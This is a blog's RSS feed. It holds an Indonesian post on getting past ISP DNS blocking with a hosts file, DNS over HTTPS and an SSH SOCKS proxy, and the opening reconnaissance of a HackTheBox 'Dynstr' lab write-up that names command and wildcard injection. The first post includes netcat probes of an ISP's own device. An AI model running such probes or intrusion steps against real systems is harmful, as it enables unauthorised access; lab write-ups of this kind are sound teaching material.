<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>DNS on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/dns/</link>
    <description>Recent content in DNS on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 04 Nov 2021 16:40:44 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/dns/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Hosts file, DNS over HTTPS dan SSH SOCKS Proxy [ID]</title>
      <link>https://fahmifj.github.io/blog/hosts-file-dns-over-https-and-ssh-socks-proxy/</link>
      <pubDate>Thu, 04 Nov 2021 16:40:44 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/hosts-file-dns-over-https-and-ssh-socks-proxy/</guid>
      <description>Can we use these to bypass DNS filters and conceal ourselves from ISPs? Let&amp;#39;s find out!</description>
      <content:encoded><![CDATA[<p>Saat ini sebagian besar browser-browser populer sudah memiliki fitur <a href="https://developers.cloudflare.com/1.1.1.1/encrypted-dns">DNS over HTTPS (DoH)</a>. Tapi meskipun begitu, ternyata masih banyak yang belum tahu tentang adanya fitur ini.</p>
<figure>
    <img src="imgs/image-20211104224726768.png"
         alt="Settingan DoH pada Chrome dan Firefox"/> <figcaption>
            <p>Settingan DoH pada Chrome dan Firefox
            </p>
        </figcaption>
</figure>

<p><em><strong>Loh tahu dari mana?</strong></em></p>
<p><em>Flashback</em> sedikit, jadi ada beberapa teman yang setiap kali mau mengakses reddit atahu web streaming anime <del>i</del>legal, mereka harus pakai VPN untuk bypass blokirannya ISP. Karena VPN-nya ini gratisan (baca: dipakai berjamaah dan di-limit), sudah pasti jatuhnya lemot.</p>
<p>Dan setelah mereka tahu soal fitur DoH, salah satunya memberi respon berikut:</p>
<figure>
    <img src="imgs/image-20211103210137432.png"
         alt="Sebuah testimoni"/> <figcaption>
            <p>Sebuah testimoni
            </p>
        </figcaption>
</figure>

<p>Agak risih juga sih ISP di negara ini sukanya main bloc-bloc-an.</p>
<p>Nah di postingan ini saya akan coba bahas kenapa DoH bisa dipakai untuk mem-<em>bypass</em> website yang diblokir. Selanjutnya saya juga akan menggunakan dua cara alternatif untuk melakukan bypass (tanpa VPN) dan mencari tahu apakah cara&quot; tersebut sudah cukup untuk menyembunyikan kita dari ISP.</p>
<h2 id="how-do-isps-block-websites">How do ISPs block websites?</h2>
<p>Normalnya ketika kita mengakses sebuah situs, misal <code>www.reddit.com</code>, komputer kita akan mengirimkan sebuah kueri DNS ke sebuah DNS server untuk menanyakan alamat IP dari domain <code>www.reddit.com</code> agar halaman situs tersebut bisa dimuat kemudian. Kueri DNS ini biasanya diarahkan ke DNS server milik ISP/operator seluler yang kamu pakai.</p>
<p>Nah ketika kita mengakses situs yang kebetulan terdaftar di <em>blacklist</em> DNS server ISP, maka DNS server tersebut akan memberikan alamat IP palsu yang merupakan halaman blokir milik si ISP seperti merconsuar, ipo, dll.</p>
<p>Kita bisa liat alur-nya secara detail dengan WireShark, tetapi agar lebih simple, kita juga bisa menggunakan <code>tracert</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ tracert -4 -d -h <span class="m">5</span> www.reddit.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Tracing route to blockpage.****.id <span class="o">[</span>***.215.197.131<span class="o">]</span> 
</span></span><span class="line"><span class="cl">over a maximum of <span class="m">5</span> hops:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="m">1</span>     <span class="m">2</span> ms     <span class="m">2</span> ms     <span class="m">2</span> ms  192.168.1.1 
</span></span><span class="line"><span class="cl">  <span class="m">2</span>     *        *        *     Request timed out.
</span></span><span class="line"><span class="cl">  <span class="m">3</span>    <span class="m">38</span> ms    <span class="m">32</span> ms    <span class="m">24</span> ms  10.***.44.1 
</span></span><span class="line"><span class="cl">  <span class="m">4</span>    <span class="m">26</span> ms    <span class="m">31</span> ms    <span class="m">22</span> ms  ***.215.248.78 
</span></span><span class="line"><span class="cl">  <span class="m">5</span>    <span class="m">33</span> ms    <span class="m">25</span> ms    <span class="m">27</span> ms  ***.215.248.82 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Trace complete.
</span></span></code></pre></div><blockquote>
<p>Di hop kedua saya kurang yakin apakah modem ADSL tidak punya/punya hop count seperti router yang akhirnya tracert menampilkan timeout, atahu memang pure timeout.</p>
</blockquote>
<p>Berdasarkan hasil <code>tracert</code> diatas, <code>www.reddit.com</code> di <em>resolve</em> ke <code>blockpage.sensor.id</code> yang alamat IPnya <code>***.215.248.131</code> dan kita bisa validasi ini menggunakan <a href="https://toolbox.googleapps.com/apps/dig/#A/">Google Toolbox Dig</a> yang hasilnya:</p>
<figure>
    <img src="imgs/image-20211104095424598.png"
         alt="Hasil dig www.reddit.com"/> <figcaption>
            <p>Hasil dig <a href="https://www.reddit.com">www.reddit.com</a>
            </p>
        </figcaption>
</figure>

<p>Ternyata alamat dari <code>www.reddit.com</code> adalah <code>151.101.X.140</code>, bukan <code>***.215.197.131</code>!</p>
<p>Yah komputernya kena penipuan :/</p>
<p>Anyway, alur <em>request</em>-nya bisa diilustrasikan seperti berikut.</p>
<figure>
    <img src="imgs/image-20211103163418666.png"
         alt="Ilustrasi(nya)"/> <figcaption>
            <p>Ilustrasi(nya)
            </p>
        </figcaption>
</figure>

<p><em><strong>Darimana saya tahu 10.***.44.1 itu router ISP?</strong></em></p>
<p>Nope, saya gak tahu itu router atahu bukan, tapi perangkat ini punya port SSH dan SNMP, jadi kemungkinan perangkat ini di monitor.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ nc -vn 10.***.44.1 <span class="m">22</span>
</span></span><span class="line"><span class="cl">Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
</span></span><span class="line"><span class="cl">Ncat: Connected to 10.***.44.1:22.
</span></span><span class="line"><span class="cl">SSH-2.0-OpenSSH_7.5
</span></span><span class="line"><span class="cl">$ nc -u -vn 10.***.44.1 <span class="m">161</span>
</span></span><span class="line"><span class="cl">Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
</span></span><span class="line"><span class="cl">Ncat: Connected to 10.***.44.1:161
</span></span></code></pre></div><p><em><strong>Tapi kan HTTPS?</strong></em></p>
<p>Enkripsi HTTPS/TLS itu ada di bagian kontennya<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>, sedangkan paket-paket DNS kueri yang dikirimkan untuk me-<em>resolve</em> nama domain ke sebuah alamat IP tidak masuk ke dalam enkripsi tersebut.</p>
<blockquote>
<p>Kueri DNS itu mendahului trafik HTTP/S</p>
</blockquote>
<p>Jadi misalnya ketika kita melakukan login di suatu HTTPS website, ISP gak akan tahu username dan password yang kita masukkan, bentukan login page tersebut, dan bahkan sampai ke <em>endpoint</em> URLnya (<code>website.com/api/v1/login/?username=admin&amp;password=admin123</code>).</p>
<figure>
    <img src="imgs/image-20211104092043412.png"
         alt="Contoh konten yang dienkripsi"/> <figcaption>
            <p>Contoh konten yang dienkripsi
            </p>
        </figcaption>
</figure>

<p>Dengan kata lain, ISP hanya tahu tujuan kita mau kemana, tapi dia (seharusnya) gak bisa lihat apa yang kita lakukan di tempat tujuan itu.</p>
<p>Sampai disini, tentunya kita bisa menyimpulkan sendiri kenapa DoH bisa membuat komputer kita menghindari &ldquo;penipuan&rdquo; yang dilakukan DNS server ISP tersebut.</p>
<p>Yap, karena kueri DNSnya dibungkus HTTPS.</p>
<p>Awalnya DNS kueri dikirimkan tanpa enkripsi ke DNS server ISP melalui port 53, tapi dengan DoH, DNS kueri ini sekarang di <em>deliver</em> melalui HTTPS ke <em>endpoint</em> DoH yang juga HTTPS, misalnya Cloudflare: <a href="https://cloudflare-dns.com/dns-query">https://cloudflare-dns.com/dns-query</a>.</p>
<p><em><strong>Terus cloudflare-dns.com di resolve siapa?</strong></em></p>
<p>DNSnya ISP wkwkw. Yah ketahuan kan pakai DoH.</p>
<p>Tenang, kita bisa pakai versi IP 1^4-nya.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;accept: application/dns-json&#39;</span> <span class="s2">&#34;https://1.1.1.1/dns-query?name=www.reddit.com&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;Status&#34;</span>:0,<span class="s2">&#34;TC&#34;</span>:false,<span class="s2">&#34;RD&#34;</span>:true,<span class="s2">&#34;RA&#34;</span>:true,<span class="s2">&#34;AD&#34;</span>:false,<span class="s2">&#34;CD&#34;</span>:false,<span class="s2">&#34;Question&#34;</span>:<span class="o">[{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;www.reddit.com&#34;</span>,<span class="s2">&#34;type&#34;</span>:1<span class="o">}]</span>,<span class="s2">&#34;Answer&#34;</span>:<span class="o">[{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;www.reddit.com&#34;</span>,<span class="s2">&#34;type&#34;</span>:5,<span class="s2">&#34;TTL&#34;</span>:288,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net.&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.65.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.129.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.193.140&#34;</span><span class="o">}</span>,<span class="o">{</span><span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;reddit.map.fastly.net&#34;</span>,<span class="s2">&#34;type&#34;</span>:1,<span class="s2">&#34;TTL&#34;</span>:18,<span class="s2">&#34;data&#34;</span>:<span class="s2">&#34;151.101.1.140&#34;</span><span class="o">}]}</span>
</span></span></code></pre></div><h2 id="thou-shalt-bypass">Thou Shalt (By)Pass</h2>
<h3 id="hosts-file-the-primivite-dns">Hosts file: The Primivite DNS</h3>
<p>Tanpa DoH, sebenarnya kita bisa menghindari &ldquo;penipuan&rdquo; alamat IP tersebut di level <em>cache</em>.</p>
<p>Kita tahu bahwa alasan komputer kita membuat DNS kueri terlebih dahulu ke DNS server saat akan mengakses sebuah website adalah karena si komputer belum tahu alamat IP dari website/domain yang kita maksud. Setelah si komputer tahu, alamat IP dan domain web ini akan di simpan pada DNS Resolver cache. Di <em>request</em> selanjutnya, si komputer akan mengandalkan daftar cache yang ada (selama belum <em>expired</em>).</p>
<p>Pada Windows, kita bisa melihat daftar IP dan nama domain yang sudah di cache dengan menjalankan perintah berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span>ifconfig /displaydns
</span></span></code></pre></div><p>DNS server sendiri pada dasarnya hanyalah sekumpulan entry yang me-<em>mapping</em> alamat IP dengan nama domain secara dinamik. Pada level OS, terdapat sebuah file yang merupakan bentukan primivite dari DNS bersifat statik, yaitu file <code>hosts</code>.</p>
<p>File <code>hosts</code> Windows bisa ditemukan di <code>C:\Windows\System32\drivers\etc\hosts</code> sedangkan untuk Unix-like, file <code>hosts</code> terdapat di <code>/etc/hosts</code>. Karena saya pengguna Windows, yang akan di bahas disini adalah <code>hosts</code> file Windows saja (pengguna Linux rata-rata sudah suhu soalnya).</p>
<figure>
    <img src="imgs/image-20211104123812239.png"
         alt="Windows hosts file"/> <figcaption>
            <p>Windows hosts file
            </p>
        </figcaption>
</figure>

<p>Pada Windows, file <code>hosts</code> ini akan selalu di-<em>load</em> ke dalam DNS Resolve cache, dan kita bisa memanfaatkan ini untuk memberi tahu komputer secara langsung bahwa alamat IP, misalnya <code>www.reddit.com</code>, adalah <code>151.101.129.140</code>. Caranya memberi tahunya adalah dengan menambahkan sebuah entry ke dalam file <code>hosts</code> dengan format berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># [Alamat IP] [domain name 1] [domain name 2] [domain name N]
</span></span><span class="line"><span class="cl">151.101.129.140 reddit.com www.reddit.com
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20211104131236469.png" alt="image-20211104131236469"  /></div>
</p>
<p>Sekarang kita bisa jalankan kembali perintah yang sama untuk menampilkan DNS cache, tapi sebelum itu ada baiknya DNS cache ini di-<em>flush</em> terlebih dulu.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span>ipconfig /flushdns <span class="c1"># clear cache dulu untuk menghilangkan brainwash dari DNS server ISP</span>
</span></span><span class="line"><span class="cl">C:<span class="se">\&gt;</span>ipconfig /displaydns
</span></span></code></pre></div><p>Seharusnya saat ini <code>www.reddit.com</code> dan <code>reddit.com</code> berada di entry paling atas.</p>
<p>Karena si komputer sudah tahu alamat IP dari <code>www.reddit.com</code>, maka dia tidak perlu lagi &ldquo;bertanya&rdquo; ke DNS server ISP.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ tracert -d www.reddit.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Tracing route to reddit.com <span class="o">[</span>151.101.129.140<span class="o">]</span>
</span></span><span class="line"><span class="cl">over a maximum of <span class="m">30</span> hops:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="m">1</span>   <span class="m">120</span> ms     <span class="m">2</span> ms     <span class="m">3</span> ms  192.168.43.1
</span></span><span class="line"><span class="cl">  <span class="m">2</span>     *        *        *     Request timed out.
</span></span><span class="line"><span class="cl">  <span class="m">3</span>   <span class="m">162</span> ms    <span class="m">26</span> ms    <span class="m">26</span> ms  10.***.44.2
</span></span><span class="line"><span class="cl">  <span class="m">4</span>   <span class="m">160</span> ms    <span class="m">25</span> ms    <span class="m">30</span> ms  ***.215.36.238 
</span></span><span class="line"><span class="cl">  <span class="m">5</span>   <span class="m">187</span> ms    <span class="m">46</span> ms    <span class="m">46</span> ms  180.87.12.233
</span></span><span class="line"><span class="cl">  <span class="m">6</span>   <span class="m">186</span> ms    <span class="m">57</span> ms    <span class="m">50</span> ms  180.87.12.232
</span></span><span class="line"><span class="cl">  <span class="m">7</span>   <span class="m">191</span> ms    <span class="m">49</span> ms    <span class="m">47</span> ms  180.87.12.250
</span></span><span class="line"><span class="cl">  <span class="m">8</span>    <span class="m">49</span> ms    <span class="m">49</span> ms    <span class="m">48</span> ms  210.57.30.38
</span></span><span class="line"><span class="cl">  <span class="m">9</span>   <span class="m">188</span> ms    <span class="m">53</span> ms    <span class="m">52</span> ms  202.84.219.174
</span></span><span class="line"><span class="cl"> <span class="m">10</span>    <span class="m">70</span> ms    <span class="m">49</span> ms    <span class="m">52</span> ms  202.84.219.174
</span></span><span class="line"><span class="cl"> <span class="m">11</span>    <span class="m">60</span> ms    <span class="m">54</span> ms    <span class="m">49</span> ms  202.84.224.197
</span></span><span class="line"><span class="cl"> <span class="m">12</span>    <span class="m">83</span> ms    <span class="m">80</span> ms    <span class="m">85</span> ms  210.57.38.171
</span></span><span class="line"><span class="cl"> <span class="m">13</span>   <span class="m">205</span> ms   <span class="m">200</span> ms   <span class="m">203</span> ms  151.101.129.140 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Trace complete.
</span></span></code></pre></div><p><em><strong>Kalau untuk website lain gimana?</strong></em></p>
<p>Google Toolbox!</p>
<p>Jadi kamu resolve dulu IPnya lewat Google Toolbox Dig.</p>
<p><div class="img-container"><img src="imgs/image-20211104142819468.png" alt="image-20211104142819468"  /></div>
</p>
<p>Maka di <code>hosts</code> filenya:</p>
<p><div class="img-container"><img src="imgs/image-20211104142858365.png" alt="image-20211104142858365"  /></div>
</p>
<h3 id="ssh-socks-proxy--doh">SSH SOCKS Proxy + DoH</h3>
<p>Penggunaan <code>host</code> file dan DoH memang bisa mem-<em>bypass</em> Website, tapi pihak ISP tetap bisa mengetahui kita mengakses situs dan domain apa.</p>
<p>Untuk menghindari itu, salah satu cara &lsquo;murah&rsquo; dan mudah yang saya gunakan selain VPN adalah menggunakan <em>private server</em> lalu memanfaatkan fitur builtin SOCKS <a href="https://en.wikipedia.org/wiki/Proxy_server">proxy</a> dari SSH (jatuhnya transparan). <em>Private server</em> ini saya deploy sendiri di Microsoft Azure.</p>
<blockquote>
<p>Jika dari pembaca ada yang masih berstatus &lsquo;student&rsquo;, silahkan cek link berikut:</p>
<ul>
<li><a href="https://azure.microsoft.com/en-us/free/students/">https://azure.microsoft.com/en-us/free/students/</a></li>
</ul>
</blockquote>
<p>Untuk memanfaatkan SSH tunnel sebagai SOCKS proxy, perintahnya cukup simple:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ssh -i az_vm.key fproxy-user@20.109.***.213 -D <span class="m">1080</span> -N
</span></span></code></pre></div><ul>
<li><code>-D 1080</code>: Buka SOCKS proxy di port 1080 (listen)</li>
<li><code>-N</code>: Tanpa interactive shell.</li>
</ul>
<p>Saat ini SOCKS Proxy via SSH sudah tersedia di <code>127.0.0.1</code> port <code>1080</code>, dan kita tinggal mengkonfigurasikan setting-an proxy pada browser seperti berikut:</p>
<figure>
    <img src="imgs/image-20211104161049841.png"
         alt="Firefox proxy settings"/> <figcaption>
            <p>Firefox proxy settings
            </p>
        </figcaption>
</figure>

<p>Mudah kan?</p>
<p>Btw, saya pakai ekstensi browser <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a>, supaya saat <em>switch on/off</em>-nya mudah dan gak harus buka-buka settingan browser, berikut tampilannya.</p>
<figure>
    <img src="imgs/image-20211104160902204.png"
         alt="FoxyProxy Toogle"/> <figcaption>
            <p>FoxyProxy Toogle
            </p>
        </figcaption>
</figure>

<p>Konfigurasinya? sama dengan settingan browser!</p>
<figure>
    <img src="imgs/image-20211104090204141.png"
         alt="Konfigurasi SOCKS Proxy di Foxy Proxy"/> <figcaption>
            <p>Konfigurasi SOCKS Proxy di Foxy Proxy
            </p>
        </figcaption>
</figure>

<p>Dengan mengirimkan <em>request</em> ke <code>ifconfig.co/json</code>, saat ini IP saya adalah IP dari si private server.</p>
<figure>
    <img src="imgs/image-20211104090145368.png"
         alt="Akses ifconfig.co dengan proxy"/> <figcaption>
            <p>Akses ifconfig.co dengan proxy
            </p>
        </figcaption>
</figure>

<p>Lalu ditambah dengan DoH dan di test lewat <a href="https://dnsleaktest.com/">https://dnsleaktest.com/</a>.</p>
<figure>
    <img src="imgs/image-20211104090533201.png"
         alt="Test DNS leak dengan DoH aktif"/> <figcaption>
            <p>Test DNS leak dengan DoH aktif
            </p>
        </figcaption>
</figure>

<p>Sampai sini seharusnya ISP kurang lebih hanya melihat komputer saya yang mengakses si private server dengan trafik seperti berikut.</p>
<figure>
    <img src="imgs/image-20211104152555436.png"
         alt="Web trafic yang terenkripsi melalui SSH tunnel"/> <figcaption>
            <p>Web trafic yang terenkripsi melalui SSH tunnel
            </p>
        </figcaption>
</figure>

<h2 id="conclusion">Conclusion</h2>
<p>Selain menggunakan VPN, setidaknya ada 3 solusi di postingan ini yang bisa kamu coba untuk mem-bypass DNS filter yang diterapkan oleh ISP langganan kamu:</p>
<ul>
<li>Hosts file,</li>
<li>DoH,</li>
<li>SSH SOCKS Proxy + DoH.</li>
</ul>
<p>Menggunakan <code>hosts</code> file dan DoH hanya sebatas menghindari komputer kita dari &ldquo;penipuan&rdquo; alamat palsu oleh DNS server ISP. Sedangkan untuk &ldquo;SSH SOCKS Proxy + Doh&rdquo;, selain menghindari &ldquo;penipuan&rdquo;, tunnel yang dibuat juga mengenkripsi keseluruhan trafik web kita.</p>
<p>Hasil <em>testing</em> ketiganya, bukan <em>testing</em> sih, bisa ditabelkan(?) seperti berikut.</p>
<div class="force-center">
<table>
<thead>
<tr>
<th></th>
<th>Bypass DNS filters</th>
<th>Hide the domain we visit ?</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hosts file</td>
<td>Probably yes</td>
<td>No</td>
</tr>
<tr>
<td>DoH</td>
<td>Yes, mostly</td>
<td>No</td>
</tr>
<tr>
<td>DoH + SSH SOCKS Proxy</td>
<td>Yes, mostly, but it depends.</td>
<td>Yes</td>
</tr>
</tbody>
</table>
</div>
<p><em><strong>Apakah dengan ini saya sudah <del>bisa menjadi anggota</del> anonymous?</strong></em></p>
<p>Nope, karena private server yang saya pakai pun milik sesuatu yang lebih besar dari ISP dan dua-duanya mengumpulkan data juga.</p>
<p>Baiklah, sekian untuk postingan ini~</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://https.cio.gov/faq/#what-does-https-do">https://https.cio.gov/faq/#what-does-https-do</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Dynstr</title>
      <link>https://fahmifj.github.io/hackthebox/dynstr/</link>
      <pubDate>Mon, 18 Oct 2021 03:04:29 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/dynstr/</guid>
      <description>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</description>
      <content:encoded><![CDATA[<p>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Command injection</li>
<li>Dynamic DNS</li>
<li>Wildcard injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers 3 open ports: SSH on 22, BIND 9 DNS on 53, and an Apache web server on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-dynstr 10.10.10.244
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:06 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.244
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.078s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">53/tcp open  domain  syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 41.14 seconds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p22,53,80 -sC -sV -oA nmap/10-tcp-allport-scripts-dynstr 10.10.10.244
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:07 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.244
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.54s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: 9.16.1-Ubuntu
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Dyna DNS
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.76 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, there is a company website named <strong>DYNA DNS</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082250725.png" alt="image-20210617082250725"  /></div>
</p>
<p>This company offers a <a href="https://www.youtube.com/watch?v=rOLGvZagdC0">dynamic DNS</a> service and states that the service is still in beta. There is also shared credentials to use this service.</p>
<p><div class="img-container"><img src="imgs/image-20210617082428463.png" alt="image-20210617082428463"  /></div>
</p>
<p>At the bottom of the page, it reveals another domain name: <code>dyna.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082655557.png" alt="image-20210617082655557"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with all the discovered domain names :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.244 dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb&#39;</span> 
</span></span></code></pre></div><p>These domain points to the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.244/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb<span class="p">;</span> <span class="k">do</span> curl -s http://<span class="nv">$i</span>/ <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span> 
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span></code></pre></div><h3 id="dns-api">DNS API</h3>
<p>As previously stated in the website, it seems to use the dynamic DNS service, I can refer to <a href="https://www.noip.com/integrate/request">no-ip.com</a>:</p>
<p><div class="img-container"><img src="imgs/image-20210617090837052.png" alt="image-20210617090837052"  /></div>
</p>
<p>To use the service, I will send a request and supply the shared credentials (<code>'dynadns:sndanyd'</code>) in the Authorization header:</p>
<p><div class="img-container"><img src="imgs/image-20210617091044264.png" alt="image-20210617091044264"  /></div>
</p>
<p>It returned with <code>good</code>.</p>
<p>With <code>dig</code>, I can confirm that my domain name has been added to the DNS entry.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf.no-ip.htb
</span></span><span class="line"><span class="cl">
